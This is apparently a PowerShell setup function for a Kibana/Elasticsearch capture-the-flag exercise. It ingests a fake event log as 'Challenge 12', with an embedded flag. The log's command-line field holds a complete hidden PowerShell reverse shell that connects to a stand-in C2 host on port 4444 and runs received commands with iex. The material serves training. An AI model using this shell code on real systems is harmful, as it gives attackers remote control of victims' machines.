function challenge {
    $dateNow = ($(Get-Date -AsUTC).AddHours(-2)).ToString("o")
    $challenge = [PSCustomObject]@{
        '@timestamp' = $dateNow
        message = "Just a regular event log, nothing to see here."
        tags = @("critical")
        host = [PSCustomObject]@{
            name = "not_nics_machine"
        }
        process = [PSCustomObject]@{
            name = "yams.exe"
            command_line = @'
            powershell -NoProfile -WindowStyle Hidden -Command "& {
            $host = 'not-a-malware-c2';
            $port = 4444;
            $secret_key_1 = "{ctf_c2_with_powershell_is_fun}"
            $client = New-Object System.Net.Sockets.TCPClient($host, $port);
            $stream = $client.GetStream();
            [byte[]]$buffer = New-Object byte[] 1024;
            while (($bytesRead = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
                $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer, 0, $bytesRead);
                $result = iex $data 2>&1 | Out-String;
                $response = (New-Object -TypeName System.Text.ASCIIEncoding).GetBytes($result);
                $stream.Write($response, 0, $response.Length);
                $stream.Flush();
            }
            $client.Close();
'@
        }
    } | ConvertTo-Json
    $ingestIndexIDURL = $Elasticsearch_URL+"/logs-kibana-ctf/_create/e2N0Zl93b3dfbmljZV9qb2JfZmluZGluZ190aGlzX2N1c3RvbV9pZH0"

    $result = Invoke-Ingest-Elasticsearch-Documents -documentToIngest $challenge -customUrl $ingestIndexIDURL

    return Write-Host "Challenge 12 imported." -ForegroundColor Green
}
